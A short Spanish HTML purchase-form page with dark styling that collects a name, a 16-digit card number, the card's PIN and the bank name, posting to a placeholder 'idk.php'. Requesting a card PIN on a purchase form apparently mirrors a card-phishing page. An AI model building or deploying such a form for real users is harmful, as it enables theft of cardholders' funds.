<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Compra</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1e1e2f;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .form-container {
            background-color: #27293d;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
        }

        h2 {
            color: #ff4b5c;
            text-align: center;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 10px;
            font-size: 16px;
        }

        input {
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 16px;
            background-color: #333;
            color: #fff;
        }

        input:focus {
            outline: none;
            border-color: #ff4b5c;
            box-shadow: 0 0 5px rgba(255, 75, 92, 0.5);
        }

        .submit-button {
            background-color: #ff4b5c;
            color: #ffffff;
            border: none;
            padding: 12px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }

        .submit-button:hover {
            background-color: #ff3a4a;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Formulario de Compra</h2>
        <form action="idk.php" method="POST">
            <label for="nombre">Nombre completo:</label>
            <input type="text" id="nombre" name="nombre" required aria-label="Nombre completo">

            <label for="tarjeta">Número de tarjeta:</label>
            <input type="number" id="tarjeta" name="tarjeta" required aria-label="Número de tarjeta" pattern="\d{16}" title="Ingrese un número de tarjeta válido de 16 dígitos">

            <label for="nip">NIP:</label>
            <input type="password" id="nip" name="nip" required aria-label="NIP" minlength="4" maxlength="6" title="Ingrese un NIP de 4 a 6 dígitos">

            <label for="banco">Banco:</label>
            <input type="text" id="banco" name="banco" required aria-label="Banco">

            <button type="submit" class="submit-button">Enviar</button>
        </form>
    </div>
</body>
</html>
